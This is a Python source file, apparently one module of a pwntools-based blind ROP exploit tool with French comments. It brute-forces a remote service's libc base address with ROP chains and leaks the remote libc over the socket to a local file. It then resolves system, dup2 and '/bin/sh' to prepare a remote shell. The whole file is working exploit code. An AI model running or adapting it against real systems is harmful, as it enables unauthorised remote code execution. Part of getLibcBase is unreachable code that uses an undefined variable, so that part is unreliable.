#!/usr/bin/python3

from pwn import *
from subprocess import PIPE, Popen
import sys

from argsprint import *

##### LIBCBASE #####--------------------------------------------------------------------------------

def getLibcBase(ExploitStructure):

    BEGIN   = ExploitStructure.beginning()

    LIBCOFFSET  = -0x384000 
    return(p64(u64(ExploitStructure.BINBASE) + LIBCOFFSET))
    
    # v v v v v  PARTIE INUTILE UNE FOIS L'ADRESSE DE LA BASE DETERMINEE  v v v v v
    LIBCBASE    = u64(ExploitStructure.BINBASE) - 0x1000
    COUNT       = 0

    BROP7   = p64(u64(ExploitStructure.BROPGADGET) + 0x7)
    BROP9   = p64(u64(ExploitStructure.BROPGADGET) + 0x9)
    R15     = b'JUNKJUNK'

    LEN     = 0x10  # RDX
    SOCKET  = 0x4   # RDI
    
    for i in range(LIBCBASE, 0, -0x1000):

        COUNT += 1
        r = ExploitStructure.remoteConnect()

        #JUNK       = r.recv()      # "Enter your choice"
            
        ROPCHAIN    = BROP7 + p64(i) + R15 + BROP9 + p64(SOCKET) + LEAKADR
        PAYLOAD     = BEGIN + ROPCHAIN

        print(CPUR + '[-] Tested base address : ' + hex(i) + CEND, end='\r')

        r.send(PAYLOAD)
        sleep(DODO)

        #--------------------
        RESP    = r.recv()

        if b'ELF' in RESP:
            printDone("Libc based found at : {}".format(hex(i)))
            printDone("Offset from the binary base address is : {}".format(hex(COUNT * -0x1000)))
            printLight("Update getLibcBase() function !")
            r.close()
            LIBCBASE = i    # dans le cas d'un binaire non remappe (donc avec
            continue        # des adresses ne commençant pas par 0xf7f___...

        try:
            r.close()
        except:
            pass


####################--------------------------------------------------------------------------------

##### LEAK LIBC #####-------------------------------------------------------------------------------

def leakStuff(ExploitStructure) :   # Permet de fuiter n'importe quoi ; en gros, sert a faire des tests

    BEGIN   = ExploitStructure.beginning()
    i       = u64(ExploitStructure.LIBCBASE)

    BROP7   = p64(u64(ExploitStructure.BROPGADGET) + 0x7)
    BROP9   = p64(u64(ExploitStructure.BROPGADGET) + 0x9)
    R15     = b'JUNKJUNK'

    LEN     = 0x10  # RDX
    SOCKET  = 0x4   # RDI
    
    FILE    = open("LEAKEDLIBC", "wb")
    LEN     = 0x1

    printInfo("Leaking first 0x600 bytes of Libc...")

    while (i < u64(ExploitStructure.LIBCBASE)+0x601):

        r = ExploitStructure.remoteConnect()

        JUNK        = r.recv()      # "Enter your choice"
            
        ROPCHAIN    = BROP7 + p64(i) + R15 + BROP9 + p64(SOCKET) + ExploitStructure.LEAKADR
        PAYLOAD     = BEGIN + ROPCHAIN

        r.sendline(PAYLOAD)
        sleep(DODO)

        JUNK    = r.recvline()

        try:
            RESP    = r.recvall()
        except:
            continue

        LEN = len(RESP)
        if len(RESP) == 0:
            RESP    = b'\x00'
            LEN     = 1

        i += LEN
        print(CPUR + '[-] Offset : ' + hex(i) + CEND, end='\r')
        FILE.write(RESP)
        FILE.flush()

        try:
            r.close()
        except:
            pass

    FILE.close()


##### Symboles #####--------------------------------------------------------------------------------

def getSymboles(ExploitStructure):

    BASE = u64(ExploitStructure.LIBCBASE)

    if not ExploitStructure.NOLIBLEAK:
        cmd = 'readelf -n LEAKEDLIBC | grep BUILD_ID -A1'
        try:
            printInfo("Getting BuildID...")
            p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
            stdout, stderr = p.communicate()
            ExploitStructure.BUILDID = (stdout.decode("utf-8")).split(': ')[1].strip("\x0A")
            # ATTENTION, visiblement on peut avoir besoin de : ExploitStructure.BUILDID = (stdout.decode("utf-8")).split('tion: ')[1].strip("\x0A")
            printDone("BuildID   :   " + ExploitStructure.BUILDID) 

        except IndexError:
            printError("Can't get BuildID : problem with the leaked libc")
            exit(2)
        except Exception as e:
            printError("Can't get BuildID ; exception information : " + str(e))
            exit(2)

    try:
        LIBC = ELF(pwnlib.libcdb.search_by_build_id(ExploitStructure.BUILDID))
    except TypeError:
        printError("Error with the given BuildID")
        exit(2)

    SYSTEM  = p64(BASE + LIBC.symbols.system)
    DUP2    = p64(BASE + LIBC.symbols.dup2)
    BINSH   = p64(BASE + next(LIBC.search(b'/bin/sh\x00')))

    return SYSTEM, DUP2, BINSH


